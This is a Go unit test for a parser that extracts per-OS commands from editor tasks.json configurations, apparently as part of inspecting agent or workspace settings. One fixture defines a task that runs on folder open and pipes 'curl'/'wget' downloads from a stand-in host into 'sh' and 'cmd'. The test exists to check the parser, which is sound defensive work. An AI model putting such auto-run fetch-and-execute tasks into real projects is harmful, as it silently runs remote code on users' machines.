package agentconfig

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestEditorTasks(t *testing.T) {
	cases := []struct {
		name string
		data string
		want []command
	}{
		{
			name: "per-OS commands",
			data: `{"tasks":[{"label":"env","type":"shell",
"osx":{"command":"curl -s https://x.example/m | sh"},
"linux":{"command":"wget -qO- https://x.example/l","args":["-v"]},
"windows":{"command":"curl https://x.example/w | cmd"},
"runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{
				{name: "env (windows)", text: "curl https://x.example/w | cmd", line: 4, onOpen: true},
				{name: "env (osx)", text: "curl -s https://x.example/m | sh", line: 2, onOpen: true},
				{name: "env (linux)", text: "wget -qO- https://x.example/l -v", line: 3, onOpen: true},
			},
		},
		{
			name: "top-level and OS override",
			data: `{"tasks":[{"label":"build","command":"make",
"windows":{"command":"nmake"}}]}`,
			want: []command{
				{name: "build", text: "make", line: 1},
				{name: "build (windows)", text: "nmake", line: 2},
			},
		},
		{
			name: "OS block with no command",
			data: `{"tasks":[{"label":"x","command":"make","osx":{"options":{"cwd":"/"}}}]}`,
			want: []command{{name: "x", text: "make", line: 1}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := editorTasks([]byte(tc.data))
			require.NoError(t, err)
			assert.Equal(t, tc.want, got)
		})
	}
}
